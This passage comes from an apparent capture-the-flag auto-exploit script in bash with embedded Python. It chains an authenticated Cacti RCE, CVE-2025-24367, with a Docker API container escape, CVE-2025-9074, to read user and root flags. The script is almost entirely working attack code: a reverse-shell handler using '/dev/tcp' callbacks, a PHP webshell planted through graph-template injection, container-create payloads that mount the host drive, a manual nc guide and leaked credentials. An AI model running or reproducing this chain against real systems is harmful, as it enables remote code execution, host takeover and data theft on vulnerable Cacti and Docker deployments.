        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"Detach\":false,\"Tty\":false}}' "
        f"http://{api}/exec/{eid}/start",
        3)

    val = extract_flag(run_out)
    if val:
        flag("ROOT FLAG", val)
        with open(os.path.join(LOOT, 'root.txt'), 'w') as f:
            f.write(val + '\n')
        return val
    return ""

def docker_escape_revshell(conn, api, image):
    """
    Fallback: Create a container with a reverse shell callback.
    Opens a second listener on RPORT.
    """
    import socket as _sock, threading, json as _json

    log(f"Fallback: Spawning root reverse shell to {LHOST}:{RPORT}...", YELLOW)

    CMD = f"bash -c 'cat /host_root/Users/Administrator/Desktop/root.txt > /tmp/flag && bash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1'"
    CREATE = _json.dumps({
        "Image": image,
        "Cmd": ["bash", "-c", CMD],
        "HostConfig": {"Binds": ["/mnt/host/c:/host_root"]}
    }).replace('"', '\\"')

    # Start second listener in background
    root_flag_holder = [None]

    def listen_root():
        srv2 = _sock.socket()
        srv2.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
        srv2.bind(('0.0.0.0', RPORT))
        srv2.listen(1)
        srv2.settimeout(30)
        try:
            c2, _ = srv2.accept()
            time.sleep(1)
            out = send_cmd(c2, "cat /tmp/flag 2>/dev/null || cat /host_root/Users/Administrator/Desktop/root.txt", 2)
            val = extract_flag(out)
            if val:
                root_flag_holder[0] = val
                flag("ROOT FLAG (reverse shell)", val)
                with open(os.path.join(LOOT, 'root.txt'), 'w') as f:
                    f.write(val + '\n')
            c2.close()
        except: pass
        srv2.close()

    t = threading.Thread(target=listen_root, daemon=True)
    t.start()

    # Create + start container from victim shell
    send_cmd(conn,
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d \"{CREATE}\" http://{api}/containers/create -o /tmp/rc.json",
        2)
    cid_out = send_cmd(conn, "cat /tmp/rc.json", 1)
    import re
    m = re.search(r'"Id"\s*:\s*"([a-f0-9]+)"', cid_out)
    if m:
        rcid = m.group(1)
        send_cmd(conn, f"curl -s -X POST -d '' http://{api}/containers/{rcid}/start", 2)
    t.join(timeout=35)
    return root_flag_holder[0] or ""

def main():
    os.makedirs(LOOT, exist_ok=True)
    conn = wait_for_shell()
    conn = stabilize_shell(conn)

    user_flag = get_user_flag(conn)
    root_flag = docker_escape(conn)

    # Summary
    print("\n" + "="*60)
    ok(f"USER  → {user_flag or 'check ' + LOOT + '/user.txt'}")
    ok(f"ROOT  → {root_flag or 'check ' + LOOT + '/root.txt'}")
    print("="*60 + "\n")

    conn.close()

if __name__ == '__main__':
    main()
PYEOF

    chmod +x "$WORKDIR/tools/shell_handler.py"
    ok "Shell handler written → $WORKDIR/tools/shell_handler.py"
}

# ════════════════════════ PHASE 7: FIRE ════════════════════════
phase_fire() {
    phase "7" "Launching Exploit + Automated Exfiltration"

    POC_DIR="$WORKDIR/exploit/CVE-2025-24367-Cacti-PoC"

    info "Target  : http://$CACTI_HOST"
    info "Creds   : ${CACTI_USER}:${CACTI_PASS}"
    info "Callback: ${LHOST}:${SHELL_PORT}"
    echo ""

    # Pick payload HTTP serving port (80 preferred, auto-fallback if busy).
    if ! choose_payload_http_port; then
        return 1
    fi
    info "Payload HTTP port: ${BOLD}${PAYLOAD_HTTP_PORT}${NC}"

    # Verify Cacti login before wasting time
    step "Verifying Cacti credentials before exploit..."
    CACTI_TEST=$(curl -sS -o /dev/null -w "%{http_code}" \
                 -c /tmp/cacti_check.jar \
                 -b /tmp/cacti_check.jar \
                 -X POST \
                 -d "action=login&login_username=${CACTI_USER}&login_password=${CACTI_PASS}" \
                 "http://$CACTI_HOST/cacti/index.php" 2>/dev/null || true)
    [[ "$CACTI_TEST" =~ ^[0-9]{3}$ ]] || CACTI_TEST="000"

    if [[ "$CACTI_TEST" == "200" || "$CACTI_TEST" == "302" ]]; then
        ok "Cacti login reachable (HTTP $CACTI_TEST)"
    else
        warn "Cacti responded with HTTP $CACTI_TEST proceeding anyway"
    fi

    echo ""
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}Starting shell handler in background...${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # Run shell handler in background
    TARGET="$TARGET" LHOST="$LHOST" LPORT="$SHELL_PORT" \
    RPORT="$ROOT_PORT" DOCKER_API="$DOCKER_API" \
    DOCKER_IMAGE="$DOCKER_IMAGE" WORKDIR="$WORKDIR" \
    python3 "$WORKDIR/tools/shell_handler.py" &
    HANDLER_PID=$!

    sleep 2  # Give handler time to bind port

    echo ""
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}Launching CVE-2025-24367 Cacti exploit...${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    cd "$POC_DIR"
    local -a HTTP_PORT_ARG=()
    if python3 exploit.py -h 2>&1 | grep -q -- '--http-port'; then
        HTTP_PORT_ARG=(--http-port "$PAYLOAD_HTTP_PORT")
    fi

    # Root only needed for privileged payload port
    if [[ $EUID -eq 0 || "$PAYLOAD_HTTP_PORT" -ge 1024 ]]; then
        python3 exploit.py \
            -url "http://$CACTI_HOST" \
            -u "$CACTI_USER" \
            -p "$CACTI_PASS" \
            -i "$LHOST" \
            -l "$SHELL_PORT" \
            "${HTTP_PORT_ARG[@]}" 2>&1 | tee "$WORKDIR/loot/exploit_output.txt" | \
            while read -r l; do echo -e "    ${DIM}$l${NC}"; done
    else
        warn "Exploit needs root for privileged payload port running with sudo"
        if [[ -t 0 ]]; then
            sudo env TARGET="$TARGET" LHOST="$LHOST" \
                python3 exploit.py \
                -url "http://$CACTI_HOST" \
                -u "$CACTI_USER" \
                -p "$CACTI_PASS" \
                -i "$LHOST" \
                -l "$SHELL_PORT" \
                "${HTTP_PORT_ARG[@]}" 2>&1 | tee "$WORKDIR/loot/exploit_output.txt" | \
                while read -r l; do echo -e "    ${DIM}$l${NC}"; done
        elif sudo -n true 2>/dev/null; then
            sudo -n env TARGET="$TARGET" LHOST="$LHOST" \
                python3 exploit.py \
                -url "http://$CACTI_HOST" \
                -u "$CACTI_USER" \
                -p "$CACTI_PASS" \
                -i "$LHOST" \
                -l "$SHELL_PORT" \
                "${HTTP_PORT_ARG[@]}" 2>&1 | tee "$WORKDIR/loot/exploit_output.txt" | \
                while read -r l; do echo -e "    ${DIM}$l${NC}"; done
        else
            warn "Non-interactive run cannot prompt for sudo password skipping reverse-shell stage"
            warn "Proceeding to HTTP webshell fallback phase"
            kill "$HANDLER_PID" 2>/dev/null || true
            cd - >/dev/null
            return 1
        fi
    fi
    cd - >/dev/null

    if [[ -f "$WORKDIR/loot/exploit_output.txt" ]] && \
       grep -qiE "Exploit failed to execute|Login Failed|No Cacti Instance|sudo: a password is required|Traceback" \
           "$WORKDIR/loot/exploit_output.txt"; then
        warn "Exploit output indicates immediate failure skipping shell wait timeout"
        kill "$HANDLER_PID" 2>/dev/null || true
    fi

    # Wait for shell handler to finish
    wait "$HANDLER_PID" 2>/dev/null || true
}

# ════════════════════════ PHASE 8: WEBSHELL FALLBACK ════════════════════════
phase_webshell_fallback() {
    local user_file="$WORKDIR/loot/user.txt"
    local root_file="$WORKDIR/loot/root.txt"

    if is_flag_captured "$user_file" && is_flag_captured "$root_file"; then
        ok "Both flags already captured from reverse-shell workflow"
        return 0
    fi

    phase "8" "HTTP Webshell Fallback (No Reverse Callback Needed)"
    info "Attempting direct command execution via Cacti webshell to recover missing flags"

    cat > "$WORKDIR/tools/http_flag_fallback.py" << 'PYEOF'
#!/usr/bin/env python3
import os
import re
import sys
import json
import random
import string
import requests

CACTI_URL = os.environ.get("CACTI_URL", "").rstrip("/")
CACTI_USER = os.environ.get("CACTI_USER", "marcus")
CACTI_PASS = os.environ.get("CACTI_PASS", "wonderful1")
DOCKER_IMAGE = os.environ.get("DOCKER_IMAGE", "docker_setup-nginx-php:latest")
WORKDIR = os.environ.get("WORKDIR", "/tmp")
LOOT = os.path.join(WORKDIR, "loot")

S = requests.Session()
S.timeout = 12

def die(msg):
    print(f"ERR={msg}")
    sys.exit(1)

def find_csrf(text: str) -> str:
    m = re.search(r'var csrfMagicToken\s*=\s*"(sid:[a-z0-9]+,[a-z0-9]+)', text)
    if not m:
        m = re.search(r'name="__csrf_magic"\s+value="([^"]+)"', text)
    return m.group(1) if m else ""

def req(method: str, path: str, **kwargs):
    url = path if path.startswith("http") else (CACTI_URL + path)
    return S.request(method, url, timeout=kwargs.pop("timeout", 20), **kwargs)

def login():
    r = req("GET", "/")
    csrf = find_csrf(r.text)
    if not csrf:
        die("csrf token not found on login page")
    data = {
        "__csrf_magic": csrf,
        "action": "login",
        "login_username": CACTI_USER,
        "login_password": CACTI_PASS,
    }
    r2 = req("POST", "/cacti/index.php", data=data, allow_redirects=True)
    t = r2.text.lower()
    if "you are now logged into" in t or "logout" in t or "console" in t:
        return
    die("cacti login failed")

def create_webshell():
    # Find target graph template id
    r = req("GET", "/cacti/graph_templates.php?filter=Unix - Logged in Users&rows=-1&has_graphs=false")
    m = re.search(r"id=['\"]chk_(\d+)['\"]", r.text)
    if not m:
        die("could not locate graph template id")
    tid = m.group(1)

    # Get edit CSRF token
    e = req("GET", f"/cacti/graph_templates.php?action=template_edit&id={tid}")
    csrf = find_csrf(e.text)
    if not csrf:
        die("could not locate graph template csrf token")

    fname = "WS" + "".join(random.choices(string.ascii_letters + string.digits, k=6)) + ".php"
    payload = "<?=`$_GET[c]`;?>"
    right_axis_label = (
        "XXX\n"
        "create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200\n"
        f"graph {fname} -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:{payload}\n"
    )

    data = {
        "__csrf_magic": csrf,
        "name": "Unix - Logged in Users",
        "graph_template_id": tid,
        "graph_template_graph_id": tid,
        "save_component_template": "1",
        "title": "|host_description| - Logged in Users",
        "vertical_label": "percent",
        "image_format_id": "3",
        "height": "200",
        "width": "700",
        "base_value": "1000",
        "slope_mode": "on",
        "auto_scale": "on",
        "auto_scale_opts": "2",
        "auto_scale_rigid": "on",
        "upper_limit": "100",
        "lower_limit": "0",
        "unit_value": "",
        "unit_exponent_value": "",
        "unit_length": "",
        "right_axis": "",
        "right_axis_label": right_axis_label,
        "right_axis_format": "0",
        "right_axis_formatter": "0",
        "left_axis_formatter": "0",
        "auto_padding": "on",
        "tab_width": "30",
        "legend_position": "0",
        "legend_direction": "0",
        "rrdtool_version": "1.7.2",
        "action": "save",
    }

    req("POST", "/cacti/graph_templates.php?header=false", data=data, allow_redirects=True)

    # Trigger several graph ids; this is noisy but reliable on this target.
    candidates = [3, 1, 2, 4, 5, 10, 20, 50, 100, 150, 200, 226] + list(range(6, 80))
    shell_url = f"/cacti/{fname}"
    for gid in candidates:
        req("GET", f"/cacti/graph_json.php?rra_id=0&local_graph_id={gid}&graph_start=1761683272&graph_end=1761769672&graph_height=200&graph_width=700")
        r = req("GET", shell_url)
        if r.status_code == 200 and "file not found" not in r.text.lower():
            return shell_url
    die("webshell file not generated")

def run_cmd(shell_url: str, cmd: str) -> str:
    r = req("GET", shell_url, params={"c": cmd}, timeout=25)
    return r.text

def first_flag(text: str) -> str:
    m = re.search(r"[0-9a-f]{32}", text)
    return m.group(0) if m else ""

def main():
    os.makedirs(LOOT, exist_ok=True)
    login()
    shell_url = create_webshell()
    print(f"WEBSHELL={CACTI_URL}{shell_url}")

    user_out = run_cmd(shell_url, "cat /home/marcus/user.txt 2>/dev/null || find /home -name user.txt 2>/dev/null | xargs cat 2>/dev/null")
    user_flag = first_flag(user_out)
    if user_flag:
        with open(os.path.join(LOOT, "user.txt"), "w") as f:
            f.write(user_flag + "\n")
    print(f"USER_FLAG={user_flag}")

    api_probe = (
        "for h in $(ip route | awk '/default/{print $3}') 192.168.65.7 172.17.0.1 10.0.2.2; do "
        "curl -fsS http://$h:2375/version >/dev/null 2>&1 && { echo $h:2375; break; }; "
        "done"
    )
    api_out = run_cmd(shell_url, api_probe)
    api_match = re.search(r"((?:\\d{1,3}\\.){3}\\d{1,3}:2375)", api_out)
    docker_api = api_match.group(1) if api_match else "192.168.65.7:2375"
    print(f"DOCKER_API={docker_api}")

    create_json = json.dumps({
        "Image": DOCKER_IMAGE,
        "Cmd": ["cat", "/host_root/Users/Administrator/Desktop/root.txt"],
        "HostConfig": {"Binds": ["/mnt/host/c:/host_root"]},
    })

    root_cmd = (
        "cid=$(curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{create_json}' http://{docker_api}/containers/create "
        "| grep -oE '\"Id\":\"[a-f0-9]+' | cut -d'\"' -f4); "
        f"curl -s -X POST -d '' http://{docker_api}/containers/$cid/start >/dev/null; "
        "sleep 2; "
        f"curl -s \"http://{docker_api}/containers/$cid/logs?stdout=true&stderr=false\""
    )
    root_out = run_cmd(shell_url, root_cmd)
    root_flag = first_flag(root_out)
    if root_flag:
        with open(os.path.join(LOOT, "root.txt"), "w") as f:
            f.write(root_flag + "\n")
    print(f"ROOT_FLAG={root_flag}")

    if user_flag or root_flag:
        sys.exit(0)
    sys.exit(1)

if __name__ == "__main__":
    main()
PYEOF

    chmod +x "$WORKDIR/tools/http_flag_fallback.py"

    step "Running webshell fallback extractor"
    CACTI_URL="http://$CACTI_HOST" \
    CACTI_USER="$CACTI_USER" \
    CACTI_PASS="$CACTI_PASS" \
    DOCKER_IMAGE="$DOCKER_IMAGE" \
    WORKDIR="$WORKDIR" \
    python3 "$WORKDIR/tools/http_flag_fallback.py" 2>&1 | \
        tee "$WORKDIR/loot/webshell_fallback_output.txt" | \
        while read -r l; do echo -e "    ${DIM}$l${NC}"; done

    local u r
    u=$(cat "$user_file" 2>/dev/null | tr -d '\n' || true)
    r=$(cat "$root_file" 2>/dev/null | tr -d '\n' || true)

    [[ "$u" =~ ^[0-9a-f]{32}$ ]] && flag_found "USER FLAG (webshell fallback)" "$u"
    [[ "$r" =~ ^[0-9a-f]{32}$ ]] && flag_found "ROOT FLAG (webshell fallback)" "$r"
}

# ════════════════════════ MANUAL FALLBACK GUIDE ════════════════════════
manual_guide() {
    echo ""
    echo -e "${BLUE}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}${BOLD}  MANUAL FALLBACK COMMANDS (if auto-exploit failed)${NC}"
    echo -e "${BLUE}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${CYAN}# 1. Run exploit manually (terminal 1):${NC}"
    echo -e "  cd $WORKDIR/exploit/CVE-2025-24367-Cacti-PoC"
    echo -e "  sudo python3 exploit.py -url http://$CACTI_HOST -u $CACTI_USER -p $CACTI_PASS -i $LHOST -l $SHELL_PORT --http-port ${PAYLOAD_HTTP_PORT:-80}"
    echo ""
    echo -e "${CYAN}# 2. Catch shell (terminal 2):${NC}"
    echo -e "  nc -lnvp $SHELL_PORT"
    echo ""
    echo -e "${CYAN}# 3. Once inside container get user flag:${NC}"
    echo -e "  cat /home/marcus/user.txt"
    echo ""
    echo -e "${CYAN}# 4. Docker escape (run from inside container):${NC}"
    echo -e "  curl http://192.168.65.7:2375/version   # verify API"
    echo -e "  curl -X POST -H 'Content-Type: application/json' \\"
    echo -e "    -d '{\"Image\":\"${DOCKER_IMAGE}\",\"Cmd\":[\"cat\",\"/host_root/Users/Administrator/Desktop/root.txt\"],\"HostConfig\":{\"Binds\":[\"/mnt/host/c:/host_root\"]}}' \\"
    echo -e "    http://192.168.65.7:2375/containers/create -o /tmp/c.json"
    echo -e "  cid=\$(grep -oP '\"Id\":\"\\K[^\"]+' /tmp/c.json)"
    echo -e "  curl -X POST -d '' http://192.168.65.7:2375/containers/\$cid/start"
    echo -e "  sleep 3"
    echo -e "  curl 'http://192.168.65.7:2375/containers/\$cid/logs?stdout=true'"
    echo ""
    echo -e "${CYAN}# Alternative: Reverse shell to root (terminal 3):${NC}"
    echo -e "  nc -lnvp $ROOT_PORT   # listener on attacker"
    echo -e "  # inside container:"
    echo -e "  curl -X POST -H 'Content-Type: application/json' \\"
    echo -e "    -d '{\"Image\":\"${DOCKER_IMAGE}\",\"Cmd\":[\"bash\",\"-c\",\"bash -i >& /dev/tcp/${LHOST}/${ROOT_PORT} 0>&1\"],\"HostConfig\":{\"Binds\":[\"/mnt/host/c:/host_root\"]}}' \\"
    echo -e "    http://192.168.65.7:2375/containers/create -o /tmp/r.json"
    echo -e "  cid=\$(grep -oP '\"Id\":\"\\K[^\"]+' /tmp/r.json)"
    echo -e "  curl -X POST -d '' http://192.168.65.7:2375/containers/\$cid/start"
    echo -e "  # Then in nc terminal: cat /host_root/Users/Administrator/Desktop/root.txt"
    echo ""
}

# ════════════════════════ TROPHY ROOM ════════════════════════
trophy_room() {
    local user_flag root_flag
    user_flag=$(cat "$WORKDIR/loot/user.txt" 2>/dev/null | tr -d '\n' || echo "Not captured")
    root_flag=$(cat "$WORKDIR/loot/root.txt" 2>/dev/null | tr -d '\n' || echo "Not captured")

    echo ""
    echo -e "${GREEN}${BOLD}"
    cat << 'TROPHY'
  ╔════════════════════════════════════════════════════════════╗
  ║                   🏆  TROPHY ROOM  🏆                      ║
  ╠════════════════════════════════════════════════════════════╣
TROPHY
    echo -e "  ║  ${NC}${MAGENTA}${BOLD}USER${NC}${GREEN}${BOLD} → ${NC}${WHITE}${user_flag}${GREEN}${BOLD}  ║"
    echo -e "  ║  ${NC}${RED}${BOLD}ROOT${NC}${GREEN}${BOLD} → ${NC}${WHITE}${root_flag}${GREEN}${BOLD}  ║"
    echo -e "${GREEN}${BOLD}  ╠════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}${BOLD}  ║  Full Attack Chain:${NC}                                       ${GREEN}${BOLD}║${NC}"
    echo -e "${GREEN}${BOLD}  ╠════════════════════════════════════════════════════════════╣${NC}"
    cat << 'CHAIN'
  ║  [1] Nmap           → 80/HTTP + 5985/WinRM                ║
  ║  [2] /.env          → DB creds leaked                      ║
  ║  [3] IDOR           → /user?token=0 PHP type juggling      ║
  ║                       → MD5 hash dump (all users)          ║
  ║  [4] Hash Crack     → 56b32eb4... → wonderful1             ║
  ║  [5] Cacti          → marcus:wonderful1 (cred reuse)       ║
  ║  [6] CVE-2025-24367 → Cacti ≤1.2.28 authenticated RCE     ║
  ║                       → www-data shell (Docker container)  ║
  ║  [7] User flag      → /home/marcus/user.txt                ║
  ║  [8] CVE-2025-9074  → Docker Desktop API 192.168.65.7:2375 ║
  ║                       → Create container + host C: mount   ║
  ║  [9] Root flag      → /host_root/Users/Administrator/...   ║
  ╚════════════════════════════════════════════════════════════╝
CHAIN
    echo ""
    echo -e "  ${DIM}All artifacts: $WORKDIR/loot/${NC}"
    echo ""
}

# ════════════════════════ MAIN ════════════════════════
main() {
    banner
    check_deps
    phase_recon
    phase_env
    phase_idor
    phase_crack
    phase_setup_exploit
    phase_shell_handler
    phase_fire
    phase_webshell_fallback

    trophy_room
    manual_guide
}

main "$@"
